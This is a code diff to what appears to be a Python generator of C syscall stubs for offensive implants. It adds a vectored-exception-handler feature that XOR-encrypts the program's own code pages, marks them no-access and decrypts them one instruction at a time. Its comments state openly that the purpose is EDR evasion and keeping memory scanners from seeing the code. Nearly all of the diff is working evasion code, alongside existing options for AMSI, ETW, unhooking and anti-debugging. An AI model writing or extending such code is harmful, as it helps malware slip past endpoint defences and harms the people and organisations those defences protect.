@@ -511,6 +511,13 @@ typedef struct _{p}EXPORT {{
         if self.cfg.sleep_encrypt:
             sleep_init = f"\nEXTERN_C VOID {p}SleepEncrypt(DWORD dwMilliseconds); /* Sleep with memory encryption */"
 
+        veh_init = ""
+        if self.cfg.veh_encrypt:
+            veh_init = (
+                f"\nEXTERN_C BOOL {p}VehEncryptInit(VOID);    /* Init VEH-based page encryption */"
+                f"\nEXTERN_C VOID {p}VehEncryptShutdown(VOID); /* Remove VEH handler and restore pages */"
+            )
+
         strenc_init = ""
         if self.cfg.string_encrypt:
             strenc_init = f"\nEXTERN_C void {p}DecryptStringInPlace(char *buf, SIZE_T len);"
@@ -543,7 +550,7 @@ extern "C" {{
  *  {init_comment}
  * ========================================================================= */
 EXTERN_C BOOL {p}Initialize(VOID);
-{egg_init}{etw_init}{amsi_init}{unhook_init}{antidebug_init}{sleep_init}{strenc_init}{stomp_init}
+{egg_init}{etw_init}{amsi_init}{unhook_init}{antidebug_init}{sleep_init}{veh_init}{strenc_init}{stomp_init}
 
 /* =========================================================================
  *  Syscall function prototypes
@@ -623,6 +630,9 @@ EXTERN_C BOOL {p}Initialize(VOID);
 
         if self.cfg.sleep_encrypt:
             sections.append(self._c_sleep_encrypt(p))
+
+        if self.cfg.veh_encrypt:
+            sections.append(self._c_veh_encrypt(p))
 
         if self.cfg.string_encrypt:
             sections.append(self._c_string_encrypt(p))
@@ -2226,6 +2236,182 @@ VOID {p}SleepEncrypt(DWORD dwMilliseconds) {{
     }}
 
     CloseHandle(hTimer);
+}}"""
+
+    # -----------------------------------------------------------------------
+    # VEH-based on-demand memory encryption
+    # Technique credit: xop (@xopp1e) — https://github.com/xop01
+    # Uses VEH + PAGE_NOACCESS to encrypt/decrypt pages on the fly via
+    # page faults. Originally used in anti-cheat engines; adapted here
+    # for EDR evasion. Superior to Ekko-style timer-based encryption
+    # because pages are decrypted only when accessed and re-encrypted
+    # immediately after execution returns.
+    # -----------------------------------------------------------------------
+
+    def _c_veh_encrypt(self, p: str) -> str:
+        xor_key = f"0x{self.obf.generate_canary():08X}U"
+        return f"""\
+/* =========================================================================
+ *  VEH-based On-Demand Memory Encryption
+ *  Technique credit: xop (@xopp1e) — https://github.com/xop01
+ *
+ *  Instead of timer-based Ekko-style encryption, this uses a Vectored
+ *  Exception Handler (VEH) to encrypt/decrypt code pages on demand:
+ *
+ *  1. Mark protected pages as PAGE_NOACCESS
+ *  2. When code tries to execute, an EXCEPTION_ACCESS_VIOLATION fires
+ *  3. VEH handler decrypts the page, sets PAGE_EXECUTE_READ, sets a
+ *     single-step trap (TRAP flag in EFLAGS)
+ *  4. After one instruction executes, EXCEPTION_SINGLE_STEP fires
+ *  5. VEH re-encrypts the page and restores PAGE_NOACCESS
+ *
+ *  Result: code is decrypted only for the single instruction being
+ *  executed, then immediately re-encrypted. Memory scanners always
+ *  see encrypted pages.
+ *
+ *  This approach is used extensively in anti-cheat engines and serves
+ *  the same purpose for EDR evasion.
+ * ========================================================================= */
+
+/* VEH encryption state */
+static PVOID  {p}VehHandle       = NULL;
+static PBYTE  {p}VehTextBase     = NULL;
+static DWORD  {p}VehTextSize     = 0;
+static DWORD  {p}VehXorKey       = {xor_key};
+static DWORD  {p}VehPageSize     = 0;
+static volatile LONG {p}VehActive = 0;
+
+/* Track which page is currently decrypted (only one at a time) */
+static volatile PBYTE {p}VehDecryptedPage = NULL;
+
+static VOID {p}VehXorPage(PBYTE pPage, DWORD pageSize) {{
+    PDWORD pData = (PDWORD)pPage;
+    DWORD  count = pageSize / sizeof(DWORD);
+    DWORD  key   = {p}VehXorKey;
+    for (DWORD i = 0; i < count; i++)
+        pData[i] ^= key;
+}}
+
+static LONG CALLBACK {p}VehPageFaultHandler(PEXCEPTION_POINTERS pExInfo) {{
+    if (!{p}VehActive)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    DWORD code = pExInfo->ExceptionRecord->ExceptionCode;
+
+    if (code == EXCEPTION_ACCESS_VIOLATION) {{
+        /* Check if fault address is in our protected region */
+        PBYTE pFault = (PBYTE)pExInfo->ExceptionRecord->ExceptionInformation[1];
+
+        if (pFault < {p}VehTextBase ||
+            pFault >= {p}VehTextBase + {p}VehTextSize)
+            return EXCEPTION_CONTINUE_SEARCH;
+
+        /* Calculate which page was faulted */
+        DWORD pageOff = (DWORD)(pFault - {p}VehTextBase);
+        pageOff &= ~({p}VehPageSize - 1);  /* align to page boundary */
+        PBYTE pPage = {p}VehTextBase + pageOff;
+
+        /* If another page was decrypted, re-encrypt it first */
+        PBYTE pPrev = (PBYTE)InterlockedExchangePointer(
+            (volatile PVOID *) &{p}VehDecryptedPage, pPage);
+        if (pPrev && pPrev != pPage) {{
+            DWORD oldProt2;
+            VirtualProtect(pPrev, {p}VehPageSize, PAGE_READWRITE, &oldProt2);
+            {p}VehXorPage(pPrev, {p}VehPageSize);
+            VirtualProtect(pPrev, {p}VehPageSize, PAGE_NOACCESS, &oldProt2);
+        }}
+
+        /* Decrypt the faulted page */
+        DWORD oldProt;
+        VirtualProtect(pPage, {p}VehPageSize, PAGE_READWRITE, &oldProt);
+        {p}VehXorPage(pPage, {p}VehPageSize);
+        VirtualProtect(pPage, {p}VehPageSize, PAGE_EXECUTE_READ, &oldProt);
+
+        /* Set trap flag (TF) so we get EXCEPTION_SINGLE_STEP after one
+         * instruction executes — then we re-encrypt the page */
+        pExInfo->ContextRecord->EFlags |= 0x100;  /* TF = bit 8 */
+
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }}
+
+    if (code == EXCEPTION_SINGLE_STEP) {{
+        /* Re-encrypt the page that was just executed */
+        PBYTE pPage = (PBYTE)InterlockedExchangePointer(
+            (volatile PVOID *) &{p}VehDecryptedPage, NULL);
+        if (pPage) {{
+            DWORD oldProt;
+            VirtualProtect(pPage, {p}VehPageSize, PAGE_READWRITE, &oldProt);
+            {p}VehXorPage(pPage, {p}VehPageSize);
+            VirtualProtect(pPage, {p}VehPageSize, PAGE_NOACCESS, &oldProt);
+        }}
+
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }}
+
+    return EXCEPTION_CONTINUE_SEARCH;
+}}
+
+BOOL {p}VehEncryptInit(VOID) {{
+    /* Get page size */
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    {p}VehPageSize = si.dwPageSize;
+
+    /* Find own .text section */
+    PVOID pImageBase = {p}GetOwnImageBase();
+    PIMAGE_SECTION_HEADER pSec = {p}FindSection(pImageBase, ".text");
+    if (!pSec)
+        return FALSE;
+
+    {p}VehTextBase = (PBYTE)pImageBase + pSec->VirtualAddress;
+    {p}VehTextSize = pSec->Misc.VirtualSize;
+
+    /* Align size to page boundary */
+    {p}VehTextSize = ({p}VehTextSize + {p}VehPageSize - 1) & ~({p}VehPageSize - 1);
+
+    /* Register VEH handler (first handler = highest priority) */
+    {p}VehHandle = AddVectoredExceptionHandler(1, {p}VehPageFaultHandler);
+    if (!{p}VehHandle)
+        return FALSE;
+
+    /* Generate runtime XOR key from RDTSC for extra entropy */
+    ULONGLONG tsc = __rdtsc();
+    {p}VehXorKey ^= (DWORD)(tsc ^ (tsc >> 32));
+    if ({p}VehXorKey == 0) {p}VehXorKey = 0xCAFEBABE;
+
+    /* Encrypt all .text pages and mark PAGE_NOACCESS */
+    DWORD oldProt;
+    VirtualProtect({p}VehTextBase, {p}VehTextSize, PAGE_READWRITE, &oldProt);
+
+    for (DWORD off = 0; off < {p}VehTextSize; off += {p}VehPageSize) {{
+        {p}VehXorPage({p}VehTextBase + off, {p}VehPageSize);
+    }}
+
+    VirtualProtect({p}VehTextBase, {p}VehTextSize, PAGE_NOACCESS, &oldProt);
+    InterlockedExchange(&{p}VehActive, 1);
+
+    return TRUE;
+}}
+
+VOID {p}VehEncryptShutdown(VOID) {{
+    if (!{p}VehActive) return;
+    InterlockedExchange(&{p}VehActive, 0);
+
+    /* Decrypt all pages and restore normal protection */
+    DWORD oldProt;
+    VirtualProtect({p}VehTextBase, {p}VehTextSize, PAGE_READWRITE, &oldProt);
+
+    for (DWORD off = 0; off < {p}VehTextSize; off += {p}VehPageSize) {{
+        {p}VehXorPage({p}VehTextBase + off, {p}VehPageSize);
+    }}
+
+    VirtualProtect({p}VehTextBase, {p}VehTextSize, PAGE_EXECUTE_READ, &oldProt);
+
+    /* Remove VEH handler */
+    if ({p}VehHandle) {{
+        RemoveVectoredExceptionHandler({p}VehHandle);
+        {p}VehHandle = NULL;
+    }}
 }}"""
 
     # -----------------------------------------------------------------------
